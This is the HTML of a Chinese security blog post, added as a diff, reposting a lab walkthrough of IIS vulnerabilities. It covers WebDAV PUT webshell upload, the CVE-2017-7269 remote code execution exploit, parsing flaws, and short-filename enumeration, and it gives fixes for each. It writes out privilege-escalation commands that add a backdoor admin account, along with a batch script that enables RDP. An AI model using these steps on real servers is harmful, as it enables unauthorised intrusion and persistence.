@@ -1,0 +1,666 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+    
+
+    <title>Web中间件漏洞之IIS漏洞（转） | 2h0nG&#39;s Blog</title>
+    <meta name="author" content="John Doe">
+    
+    <meta name="description" content="Love is friendship fell into love">
+    
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <meta property="og:title" content="Web中间件漏洞之IIS漏洞（转）"/>
+    <meta property="og:site_name" content="2h0nG&#39;s Blog"/>
+
+    
+    <meta property="og:image" content=""/>
+    
+
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate" href="/atom.xml" title="2h0nG&#39;s Blog" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/lib/materialize.min.css">
+    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+    
+        <link rel="stylesheet" href="/css/lib/prettify-tomorrow-night-eighties.css" type="text/css">
+    
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+<meta name="generator" content="Hexo 5.0.0"></head>
+
+
+<body>
+    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
+
+    <nav class="indigo">
+    <div class="nav-wrapper">
+        <a href="#" data-activates="main-menu" class="button-collapse">
+            <i class="fa fa-navicon"></i>
+        </a>
+        <div class="">
+            <a href="/" class="brand-logo hide-on-med-and-down">2h0nG&#39;s Blog</a>
+            <ul class="right hide-on-med-and-down">
+                
+                    <li>
+                        <a class="menu-home " href="/" >
+                            <i class="fa fa-home "></i>
+                            
+                            首页
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-archive " href="/archives" >
+                            <i class="fa fa-archive "></i>
+                            
+                            归档
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                            <i class="fa fa-bookmark "></i>
+                            
+                            分类
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-reading " href="/reading" >
+                            <i class="fa fa-book "></i>
+                            
+                            读书
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-about " href="/about" >
+                            <i class="fa fa-user "></i>
+                            
+                            关于
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-search modal-trigger " href="#search" >
+                            <i class="fa fa-search "></i>
+                            
+                            搜索
+                        </a>
+                    </li>
+                
+            </ul>
+            <div>
+    <ul class="side-nav indigo darken-1" id="main-menu">
+        
+        <li class="side-user">
+            <div class="row">
+                <div class="col s4 no-padding">
+                    <img class="avatar-image circle responsive-img" src="http://ww2.sinaimg.cn/small/74990035jw1f1rjkd681bj20rs0rsdhg.jpg" alt="User Avatar">
+                </div>
+                <div class="info col s8 valign-wrapper no-padding">
+                    <div class="valign">
+                        <p class="name">2h0nG</p>
+                        <p class="desc">不断学习中</p>
+                    </div>
+                </div>
+            </div>
+        </li>
+        
+
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-home " href="/" >
+                    <i class="fa fa-home "></i>
+                    
+                    首页
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-archive " href="/archives" >
+                    <i class="fa fa-archive "></i>
+                    
+                    归档
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                    <i class="fa fa-bookmark "></i>
+                    
+                    分类
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-reading " href="/reading" >
+                    <i class="fa fa-book "></i>
+                    
+                    读书
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-about " href="/about" >
+                    <i class="fa fa-user "></i>
+                    
+                    关于
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-search modal-trigger " href="#search" >
+                    <i class="fa fa-search "></i>
+                    
+                    搜索
+                </a>
+            </li>
+        
+    </ul>
+
+    <ul class="side-nav indigo darken-1" id="category-menu">
+    
+
+            
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/数据通信安全/">
+                    数据通信安全 <span class="right">30 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/代码审计安全/">
+                    代码审计安全 <span class="right">10 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Linux系统安全/">
+                    Linux系统安全 <span class="right">12 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Web渗透测试/">
+                    Web渗透测试 <span class="right">24 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/CTF笔记/">
+                    CTF笔记 <span class="right">16 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Python学习/">
+                    Python学习 <span class="right">3 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Leetcode题解/">
+                    Leetcode题解 <span class="right">24 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/漏洞复现与分析/">
+                    漏洞复现与分析 <span class="right">1 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/数据恢复/">
+                    数据恢复 <span class="right">2 篇</span></a>
+                </a>
+            </li>
+
+        
+
+    </ul>
+</div>
+
+        </div>
+    </div>
+</nav>
+
+<div id="search" class="modal search-modal">
+    <div class="row">
+        <div class="input-field col s12">
+              <input id="search-input" type="text">
+              <label for="search-input">搜索</label>
+        </div>
+
+    </div>
+    <div id="search-result" class="search-result col s12">
+
+    </div>
+</div>
+
+
+    <main>
+        <div class="container main-container">
+    <nav class="page-nav hide-on-small-only">
+    <div class="nav-wrapper indigo">
+        <span class="breadcrumb">当前位置（分类目录）</span>
+        
+            
+    
+    
+    <a class="breadcrumb" href="/categories/Web渗透测试/">Web渗透测试</a>
+
+
+        
+
+        
+    </div>
+</nav>
+
+<article>
+    <div class="card">
+        <div class="card-content">
+            
+
+            <div class="article-title">
+                
+    
+        <h1>Web中间件漏洞之IIS漏洞（转）</h1>
+    
+
+
+            </div>
+            <time class="pink-link-context" datetime="2020-10-27T11:26:17.885Z"><a href="/2020/10/27/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BIIS%E6%BC%8F%E6%B4%9E/">2020-10-27</a></time>
+
+            <span id="busuanzi_container_page_pv" class="read-times-container">
+    <i class="fa fa-eye"></i>
+    <span id="busuanzi_value_page_pv"></span>
+</span>
+
+            
+    <div class="tags-row">
+        
+            <a href="/tags/Web渗透测试/" class="chip pink lighten-1">Web渗透测试</a>
+        
+    </div>
+
+
+            <div class="toc pink-link-context hide-on-med-and-down">
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#PUT%E6%BC%8F%E6%B4%9E"><span class="section table-of-contents-text">PUT漏洞</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#%E6%8F%90%E6%9D%83"><span class="section table-of-contents-text">提权</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="section table-of-contents-text">漏洞修复</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2017-7269"><span class="section table-of-contents-text">远程代码执行(CVE-2017-7269)</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7"><span class="section table-of-contents-text">批量检测工具</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#%E6%8F%90%E6%9D%83-1"><span class="section table-of-contents-text">提权</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="section table-of-contents-text">漏洞修复</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="section table-of-contents-text">解析漏洞</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="section table-of-contents-text">漏洞修复</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#%E7%9F%AD%E6%96%87%E4%BB%B6%E7%8C%9C%E8%A7%A3"><span class="section table-of-contents-text">短文件猜解</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-3"><span class="section table-of-contents-text">漏洞修复</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="section table-of-contents-text">参考链接</span></a></li></ol>
+</div>
+
+
+            <div class="entry pink-link-context">
+                <h1 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h1><blockquote>
+<p>原文地址：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6783">https://xz.aliyun.com/t/6783</a></p>
+</blockquote>
+<p><strong>前提条件：</strong><br><code>IIS 6.0</code>开启了<code>WebDAV</code>并且拥有<code>IIS</code>来宾用户拥有写入权限<br><strong>复现过程：</strong><br>用<code>IIS PUT SCANNER</code>探测一下目标<code>IIS</code>是否拥有写入权限<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112103-49214cde-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112103-49214cde-08e9-1.png" alt="img"></a><br>是<code>YES</code>所以可以利用<br>先看原来的服务器上面存在的内容<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112115-5017b4c4-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112115-5017b4c4-08e9-1.png" alt="img"></a><br>我们利用另一个工具对文件进行写入，我们写入一句话<code>webshell</code><br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112127-57438ff2-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112127-57438ff2-08e9-1.png" alt="img"></a><br>上传<code>test.txt</code>成功<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112135-5be532f4-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112135-5be532f4-08e9-1.png" alt="img"></a><br>上传上去是<code>txt</code>格式，于是我们用<code>MOVE</code>或者<code>COPY</code>选项把它改成<code>asp</code>后缀<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112142-6077c8a4-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112142-6077c8a4-08e9-1.png" alt="img"></a><br>菜刀连一下，拿到<code>webshell</code><br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112151-65f187ac-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112151-65f187ac-08e9-1.png" alt="img"></a></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>上传<code>cmd.exe</code>和<code>pr.exe</code>上去，这二者的用法是<code>pr</code>提权<br>执行下面这条命令，把当前终端的执行程序设置成我们上传的 <code>cmd.exe</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setp &quot;路径cmd.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们就可以<code>pr</code>提权，查看一下当前是<code>system</code>权限<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112201-6b87d018-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112201-6b87d018-08e9-1.png" alt="img"></a><br>于是我们新建管理员账户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pr.exe &quot;net user hack1 123 &#x2F;add&quot; 新建一个hack1用户，密码为123</span><br><span class="line"></span><br><span class="line">pr.exe &quot;net localgroup administrators hack1 &#x2F;add&quot; 将hack1用户加入administrators管理员组</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112211-7175af18-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112211-7175af18-08e9-1.png" alt="img"></a><br>如果对方开启了<code>3389</code>端口那么就可以用新建的用户登录，如果没有开启那么我们就上传一个<code>bat</code>文件，它可以远程开启目标的<code>3389</code>端口<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112220-772a5f76-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112220-772a5f76-08e9-1.png" alt="img"></a><br>此时运行利用<code>pr.exe</code>运行<code>3389open.bat</code>，成功开启<code>3389</code>端口，可以连接<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112230-7ca9e6e2-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112230-7ca9e6e2-08e9-1.png" alt="img"></a><br>附上<code>3389open.bat</code>文件代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;3389open.bat</span><br><span class="line">echo Windows Registry Editor Version 5.00&gt;&gt;3389.reg </span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg </span><br><span class="line">echo &quot;fDenyTSConnections&quot;&#x3D;dword:00000000&gt;&gt;3389.reg </span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg </span><br><span class="line">echo &quot;PortNumber&quot;&#x3D;dword:00000d3d&gt;&gt;3389.reg </span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg </span><br><span class="line">echo &quot;PortNumber&quot;&#x3D;dword:00000d3d&gt;&gt;3389.reg </span><br><span class="line">regedit &#x2F;s 3389.reg </span><br><span class="line">del 3389.reg</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>关闭<code>WebDAV</code>和写权限</p>
+<h1 id="远程代码执行-CVE-2017-7269"><a href="#远程代码执行-CVE-2017-7269" class="headerlink" title="远程代码执行(CVE-2017-7269)"></a>远程代码执行(CVE-2017-7269)</h1><p><strong>前提条件：</strong><br><code>IIS 6.0</code>开启<code>WebDAV</code><br><strong>复现过程：</strong><br>exp下载地址：<a target="_blank" rel="noopener" href="https://github.com/zcgonvh/cve-2017-7269">https://github.com/zcgonvh/cve-2017-7269</a><br>下载后放入<code>msf</code>中，路径为<code>/usr/share/metasploit-framework/modules/exploits/windows/iis/</code><br>注意文件名中<code>-</code>应该改为<code>_</code>否则无法识别，然后拿到了<code>shell</code>(失败后靶机恢复快照，否则可能之后的攻击无效)<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112242-8403c516-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112242-8403c516-08e9-1.png" alt="img"></a><br>这里说说我开始失败的原因<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112251-89915426-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112251-89915426-08e9-1.png" alt="img"></a><br>这种叫非默认绑定<br>这个<code>exp</code>可以直接利用，如果是绑定了的，就需要手动输入物理路径的长度和端口即可<br>目前网络上存在三种脚本，我使用的这种是第二种，区别附图<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112302-8fc16c46-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112302-8fc16c46-08e9-1.png" alt="img"></a><br>很明显第一种用处不大，可以用第二种代替，第二种和第三种区别就是需不需要手动输入物理路径的长度和端口，第三种方便，但是第三种不咋稳定我们来看看如何手动输入物理路径长度<br>现在我们默认绑定<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112311-956cdd6a-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112311-956cdd6a-08e9-1.png" alt="img"></a></p>
+<h2 id="批量检测工具"><a href="#批量检测工具" class="headerlink" title="批量检测工具"></a>批量检测工具</h2><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/admintony/Windows-Exploit/tree/master/IIS6_WebDAV_Scanner">https://github.com/admintony/Windows-Exploit/tree/master/IIS6_WebDAV_Scanner</a><br>检测出了长度为<code>71</code><br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112321-9b5e8228-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112321-9b5e8228-08e9-1.png" alt="img"></a><br>然后在<code>msf</code>上设置<code>PhysicalPathLength</code>为<code>71</code>即可<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112333-a237c898-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112333-a237c898-08e9-1.png" alt="img"></a></p>
+<h2 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h2><p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112343-a8aec050-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112343-a8aec050-08e9-1.png" alt="img"></a><br>输入<code>whoami</code>都不行，是一个低权限账户<br>再次使用<code>pr</code>提权，利用<code>meterpreter</code>上传<code>pr.exe</code><br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112354-aed24e16-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112354-aed24e16-08e9-1.png" alt="img"></a><br>然后创建用户<code>hack1</code>并添加到管理员组<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112405-b5a4762e-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112405-b5a4762e-08e9-1.png" alt="img"></a><br><code>netstat -an</code>查看是否打开了<code>3389</code>端口，发现并没有<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112417-bc9879a8-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112417-bc9879a8-08e9-1.png" alt="img"></a><br>输入<code>exit</code>回到<code>meterpreter</code>上传<code>3389open.bat</code><br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112427-c2b869ba-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112427-c2b869ba-08e9-1.png" alt="img"></a><br>然后利用<code>pr.exe</code>运行<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112439-c9beb43a-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112439-c9beb43a-08e9-1.png" alt="img"></a><br><code>netstat -an</code>查看一下，发现<code>3389</code>端口已经打开<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112452-d15de620-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112452-d15de620-08e9-1.png" alt="img"></a><br>成功登陆<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117112502-d7cdfeaa-08e9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117112502-d7cdfeaa-08e9-1.png" alt="img"></a></p>
+<h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>关闭<code>WebDAV</code></p>
+<h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><p><strong>前提条件：</strong></p>
+<p><code>IIS 6.0</code> <code>IIS 7.5</code><br><strong>复现过程：</strong><br><code>IIS 6.0</code>解析漏洞有两种利用方式<br>(1)在<code>.asp</code>目录下的任意文件会以<code>asp</code>格式解析<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117114248-52affc48-08ec-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117114248-52affc48-08ec-1.png" alt="img"></a><br>(2)<code>;</code>截断，上传<code>test.asp;.jpg</code>是一个<code>jpg</code>文件但是会以<code>asp</code>执行<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117114300-5a123ece-08ec-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117114300-5a123ece-08ec-1.png" alt="img"></a><br><code>IIS 7.0</code>解析漏洞<br>在文件后面加上<code>/xx.php</code>(xx可加可不加)就会将该文件以<code>php</code>格式执行，比如<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117114312-61875f90-08ec-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117114312-61875f90-08ec-1.png" alt="img"></a></p>
+<h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>(1)限制上传的脚本执行权限，不允许执行脚本<br>(2)对新建目录文件名进行过滤，不允许新建包含‘.’的文件<br>(3)不允许新建目录<br>(4)过滤<code>.asp/xx.jpg</code>，通过<code>ISApi</code>组件过滤</p>
+<h1 id="短文件猜解"><a href="#短文件猜解" class="headerlink" title="短文件猜解"></a>短文件猜解</h1><p><strong>前提条件：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">IIS 1.0，Windows NT 3.51  </span><br><span class="line">IIS 3.0，Windows NT 4.0 Service Pack 2  </span><br><span class="line">IIS 4.0，Windows NT 4.0选项包 </span><br><span class="line">IIS 5.0，Windows 2000  </span><br><span class="line">IIS 5.1，Windows XP Professional和Windows XP Media Center Edition  </span><br><span class="line">IIS 6.0，Windows Server 2003和Windows XP Professional x64 Edition  </span><br><span class="line">IIS 7.0，Windows Server 2008和Windows Vista  </span><br><span class="line">IIS 7.5，Windows 7（远程启用&lt;customErrors&gt;或没有web.config）</span><br><span class="line">IIS 7.5，Windows 2008（经典管道模式）</span><br><span class="line">IS 8.0，Windows 8, Windows Server 2012</span><br><span class="line">IIS 8.5，Windows 8.1,Windows Server 2012 R2</span><br><span class="line">IIS 10.0，Windows 10, Windows Server 2016</span><br><span class="line">注意：IIS使用.Net Framework 4时不受影响</span><br></pre></td></tr></table></figure>
+
+<p><strong>短文件名特征：</strong><br>1.只显示前<code>6</code>位的字符,后续字符用<code>~1</code>代替。其中数字<code>1</code>是可以递增。如果存在文件名类似的文件,则前面的<code>6</code>个字符是相同的,后面的数字进行递增<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117114326-69cd81ac-08ec-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117114326-69cd81ac-08ec-1.png" alt="img"></a><br>2.后缀名最长只有<code>3</code>位,超过<code>3</code>位的会生成短文件名,且后缀多余的部分会截断<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117114337-6ff4b0aa-08ec-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117114337-6ff4b0aa-08ec-1.png" alt="img"></a><br>3.所有小写字母均转换成大写的字母<br>4.长文件名中包含多个”.”的时候,以文件最后一个”.”作为短文件名的后缀<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117114350-77fb885a-08ec-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117114350-77fb885a-08ec-1.png" alt="img"></a><br>5.文件名后缀长度大于等于<code>4</code>或者总长度大于等于<code>9</code>时才会生成短文件名，如果包含空格或者其他部分特殊字符,不论长度均会生成短文件<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117114403-7f6fd046-08ec-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117114403-7f6fd046-08ec-1.png" alt="img"></a><br><strong>漏洞原理：</strong><br>访问构造的某个存在的短文件名，会返回<code>404</code>，访问构造的某个不存在的短文件名，返回<code>400</code><br><strong>自动化探测：</strong><br><a target="_blank" rel="noopener" href="https://github.com/lijiejie/IIS_shortname_Scanner">https://github.com/lijiejie/IIS_shortname_Scanner</a><br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117114417-8833e8ac-08ec-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117114417-8833e8ac-08ec-1.png" alt="img"></a></p>
+<h2 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>(1)升级<code>.net framework</code>到<code>4.0</code>以上<br>(2)修改注册表禁用短文件名功能快捷键<code>Win+R</code>打开命令窗口，输入<code>regedit</code>打开注册表窗口，找到路径：<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem</code>，将其中的<code>NtfsDisable8dot3NameCreation</code>这一项的值设为<code>1</code>，<code>1</code>代表不创建短文件名格式，修改完成后，需要重启系统生效(之前存在的文件依然有短文件，新建的文件满足生成短文件条件但是不会再生成)<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117114429-8ef5c21e-08ec-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117114429-8ef5c21e-08ec-1.png" alt="img"></a><br>(3)那么之前的文件已经存在短文件名仍能够被猜解怎么办呢？将目录内所有文件剪切到另外地方再粘贴回来就行，相当于新建，这些就没有短文件名无法被猜解了<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117114439-950c20a8-08ec-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117114439-950c20a8-08ec-1.png" alt="img"></a><br>使用自动化脚本试试<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191117114449-9aeb377a-08ec-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117114449-9aeb377a-08ec-1.png" alt="img"></a><br>Server is not vulnerable 防御成功</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="http://www.admintony.com/CVE-2017-7269.html">http://www.admintony.com/CVE-2017-7269.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192063.html">https://www.freebuf.com/articles/web/192063.html</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/354fcf0939cc">https://www.jianshu.com/p/354fcf0939cc</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/172561.html">https://www.freebuf.com/articles/web/172561.html</a><br><a target="_blank" rel="noopener" href="https://www.jb51.net/article/166405.htm">https://www.jb51.net/article/166405.htm</a></p>
+
+                
+<p class="pink-link-context">
